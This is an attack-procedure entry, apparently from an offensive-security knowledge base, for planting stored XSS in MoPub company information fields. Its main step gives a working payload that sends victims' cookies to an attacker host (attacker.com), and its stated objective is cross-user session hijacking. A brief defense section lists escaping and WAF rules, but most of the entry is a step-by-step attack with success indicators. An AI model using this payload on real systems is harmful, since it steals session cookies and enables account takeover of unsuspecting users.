---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
tags:
  - xss
  - injection
  - multi-field
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.315Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Script-into-Company-Information-Fields

## Summary

This procedure targets multiple company information fields in MoPub settings with stored XSS payloads, expanding execution to pages like reports and user edits.

## Description

Company info fields (e.g., name, address) in MoPub do not escape outputs, allowing stored scripts to trigger on various interfaces including email dropdowns. The scenario involves injecting payloads post-authentication. Expected results include broad persistence and execution for hijacking.

## Requirements

1. Access to account settings with company fields
2. Varied XSS payloads for different contexts
3. Testing via incognito or alternate accounts

## Defense

Defensive measures and detection strategies:

- Apply output escaping on all rendered user inputs
- Use WAF rules to detect script tags in submissions
- Audit stored data for malicious patterns

## Objectives

1. Inject payloads across multiple fields
2. Verify rendering on affected pages
3. Enable cross-user session hijacking

## Instructions

### Step 1: Identify Fields

**Context**: Locate all editable company info inputs.

Review sections for company name, address, and other details.

**Expected Output**: List of text inputs visible.

### Step 2: Inject Payloads

**Context**: Enter scripts tailored to field types.

In each field, input `<img src="x" onerror="document.location='http://attacker.com/?c='+document.cookie">` and save.

**Expected Output**: Payloads persist; test by viewing reports tab.

**Success Indicators**:
- Scripts execute on reload or other user views
- No field-specific blocking

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- stored-xss
- company-info-injection
